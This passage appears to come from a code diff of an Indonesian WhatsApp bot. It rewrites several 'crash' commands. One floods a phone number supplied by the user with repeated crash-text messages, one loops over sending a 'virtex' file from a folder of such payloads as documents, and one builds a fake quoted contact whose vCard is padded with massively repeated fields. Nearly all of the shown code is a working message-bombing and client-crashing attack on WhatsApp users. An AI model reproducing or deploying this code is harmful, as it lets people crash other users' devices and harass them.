-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(m.chat, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
                     m.reply(`BUG COLI DEK`)
                     }
                     break
 case 'kitchekamir' : { 
 if (!text) throw `Nomernya?`
                     a = await haikal.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
+                    await haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
                     m.reply(`Succes`)
                     }
 	break
@@ -5331,22 +5261,22 @@ if (args.length == 0) return m.reply(`Jumlah?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
 y1 = fs.readFileSync('./baseikal/virtex/iphone.mp3')
-haikal.sendMessage(m.chat, {document: y1, fileName: `🔥 CXZA 935 🔥 ${doc}.mp3`, quoted: m})
-haikal.sendMessage(m.chat, {document: y1, fileName: `🔥 CXZA 935 🔥 ${jobot}.txt`, quoted: m})
-haikal.sendMessage(m.chat, {document: y1, fileName: `🔥 CXZA 935 🔥 ${ngazap}.js`, quoted: m})
+haikal.sendMessage(m.chat, {document: y1, fileName: `🔥 © 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 🔥 ${doc}.mp3`, quoted: m})
+haikal.sendMessage(m.chat, {document: y1, fileName: `🔥 © 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 🔥 ${jobot}.txt`, quoted: m})
+haikal.sendMessage(m.chat, {document: y1, fileName: `🔥 © 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 🔥 ${ngazap}.js`, quoted: m})
 }
 }
 break
 case 'sendlokasi': {
 if (!mek.key.fromMe) return reply('Khusus Owner Ajg!')
 if (!text) throw `Nomernya?`
-let kontolfariz = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍 ${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:CXZA 935\nitem1.TEL:+6285775422460\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 